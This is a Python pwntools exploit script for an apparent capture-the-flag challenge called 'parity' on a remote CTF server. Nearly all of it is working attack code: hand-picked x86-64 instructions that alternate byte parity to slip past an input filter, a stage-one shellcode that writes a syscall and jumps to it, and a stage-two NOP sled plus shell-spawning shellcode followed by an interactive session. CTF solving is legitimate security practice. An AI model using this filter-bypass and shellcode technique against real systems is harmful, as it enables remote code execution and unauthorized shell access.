from pwn import *
from time import sleep
context.arch = "amd64"

#r = process("./parity")
r = remote("challs.actf.co", 31226)

# Useful instructions
# pop rbx "\x5b" -> odd nop
# pop rax "\x58" -> even nop

# xor rax, rax "\x48\x31\xc0"
# mov rdx, rax "\x48\x89\xc2"
# mov [rsi], rax "\x48\x89\x06"
# mov [rsi], rdx "\x48\x89\x16"

# jmp rsi "\xff\xe6"

# mov cx, 0x50e "\x66\xb9\x0e\x05"
# mov rdx, rcx "\x48\x89\xca"
# inc rdx "\x48\xff\xc2" -> these 3 set rdx to syscall (\x0f\x05)

parity_read_shellcode = asm(
    '''
    mov rdx, rax;
    pop rbx;
    mov cx, 0x50e;
    mov rdx, rcx;
    pop rbx;
    inc rdx;
    pop rbx;
    mov [rsi], rdx;
    jmp rsi
    '''
)
r.sendafter(b"> ", parity_read_shellcode)

sleep(1)
execve_shellcode = shellcode = b"\x90"*10 + asm(shellcraft.sh())
r.send(execve_shellcode)

r.interactive()
